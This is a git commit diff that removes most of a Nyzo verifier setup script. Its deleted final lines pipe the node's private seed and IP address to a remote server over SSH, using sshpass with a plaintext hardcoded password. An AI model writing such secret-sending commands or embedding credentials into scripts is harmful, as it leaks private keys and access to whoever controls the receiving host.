94aed66b82d91af1c8afb3a3565a5dbd8f767e82
junscapital <52300722+junscapital@users.noreply.github.com>
2020-01-08 22:52:36 +0800

    Update pvrb.sh

--- pvrb.sh
+++ pvrb.sh
@@ -1,18 +1,2 @@
 #!/bin/sh
-sudo su
-sudo apt install haveged -y
-sudo apt install openjdk-8-jdk -y
-sudo apt install supervisor -y
-sudo apt install git -y
-cd /home/ubuntu/nyzoVerifier
-sudo ./gradlew build
-sudo mkdir -p /var/lib/nyzo/production
-sudo cp trusted_entry_points /var/lib/nyzo/production
-sudo cp nyzoVerifier.conf /etc/supervisor/conf.d
-sudo bash -c 'echo 0001x$(($RANDOM%82+6)) > /var/lib/nyzo/production/nickname'
-sudo supervisorctl reload
-sleep 20s
-sudo renice -n -5 -p $(pgrep ^java$)
-echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'Tin1@3456' ssh ubuntu@111.229.209.232 'cat - >> /home/ubuntu/managed_verifiers'
-echo $(cat /var/lib/nyzo/production/nickname):$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'Tin1@3456' ssh ubuntu@111.229.209.232 'cat - >> /home/ubuntu/file1'
 
